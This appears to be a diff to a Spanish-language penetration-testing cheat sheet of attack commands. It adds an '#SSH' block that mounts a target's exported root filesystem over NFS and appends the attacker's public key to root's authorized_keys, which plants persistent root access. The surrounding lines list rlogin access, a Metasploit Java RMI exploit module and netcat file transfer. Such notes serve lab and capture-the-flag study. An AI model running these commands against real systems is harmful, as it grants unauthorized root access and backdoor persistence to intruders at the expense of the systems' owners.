@@ -7,6 +7,11 @@ rsh/rlogin USUARIO@IP // Si está habilitado rlogin en el target
 #JAVA RMI
 use exploit/multi/misc/java_rmi_server
 
+#SSH
+ssh-keygen
+mount IP:/ /mnt
+cat .ssh/id_rsa.pub >> /mnt/root/.ssh/authorized_keys
+
 #NC-NCAT-FTP
 **Transferencia de archivos**
     nc -lvp [puerto] > [archivo a guardar]
